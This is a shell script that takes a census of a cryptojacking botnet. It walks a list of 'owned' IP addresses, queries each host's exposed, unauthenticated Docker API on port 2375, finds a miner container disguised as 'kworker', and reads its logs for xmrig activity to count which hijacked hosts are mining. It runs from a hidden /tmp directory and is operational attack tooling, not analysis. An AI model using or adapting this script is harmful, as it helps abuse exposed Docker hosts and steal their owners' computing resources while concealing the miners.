#!/bin/sh
# throwaway: honest "who is actually mining" census.
# Existence of a container is NOT mining (that was the whole no-op bug), and :47999
# is not usable as truth (refused, firewalled, even squatted). So read each container's
# OWN log through its docker API and look for xmrig's live markers - the same evidence
# we used to prove the working shape on box1.
cd /tmp/.sysd/.hunt || exit 1
out=/tmp/_cen2.out
: > "$out"
tot=0; up=0; mining=0; nolog=0; noc=0; fix=0
for ip in $(cat dock.live dock.owned 2>/dev/null | cut -f1 | sort -u); do
    case "$ip" in [0-9]*.[0-9]*.[0-9]*.[0-9]*) ;; *) continue ;; esac
    tot=$((tot + 1))
    # A fixture in dock.mock is not a host we hold, whatever owned says about it. Counting
    # it here is what made "container_up=5" look like a fleet when some of those five were
    # a canned API handing back its one frozen container.
    if [ -s dock.mock ] && grep -qxF "$ip" dock.mock 2>/dev/null; then
        fix=$((fix + 1)); printf '%s\tFIXTURE\n' "$ip" >> "$out"; continue
    fi
    v=$(curl -sS -m 4 "http://$ip:2375/version" 2>/dev/null | grep -o '"ApiVersion": *"[0-9.]*"' | head -1 | cut -d'"' -f4) || v=""
    b="http://$ip:2375"
    [ -n "$v" ] && b="http://$ip:2375/v$v"
    lst=$(curl -sS -m 6 "$b/containers/json?all=1" 2>/dev/null) || lst=""
    cid=$(printf '%s' "$lst" | awk '{ n=split($0,a,"\"Id\":\""); for (i=2;i<=n;i++) if (index(a[i],"kworker")>0) { split(a[i],x,"\""); print x[1]; exit } }')
    if [ -z "$cid" ]; then noc=$((noc + 1)); printf '%s\tno-container\n' "$ip" >> "$out"; continue; fi
    up=$((up + 1))
    lg=$(curl -sS -m 6 "$b/containers/$cid/logs?stdout=1&stderr=1&tail=60" 2>/dev/null | tr -d '\000') || lg=""
    if printf '%s' "$lg" | grep -q -e 'speed 10s/60s/15m' -e 'accepted' -e 'new job'; then
        mining=$((mining + 1))
        sp=$(printf '%s' "$lg" | grep -o 'speed 10s/60s/15m[^|]*' | tail -1) || sp=""
        printf '%s\tMINING\t%s\n' "$ip" "$sp" >> "$out"
    else
        nolog=$((nolog + 1))
        tail1=$(printf '%s' "$lg" | tr -d '\r\n' | tail -c 80)
        printf '%s\tsilent\t%s\n' "$ip" "$tail1" >> "$out"
    fi
done
echo "candidates=$tot container_up=$up mining=$mining silent=$nolog no_container=$noc fixture=$fix" >> "$out"
echo "candidates=$tot container_up=$up mining=$mining silent=$nolog no_container=$noc fixture=$fix"
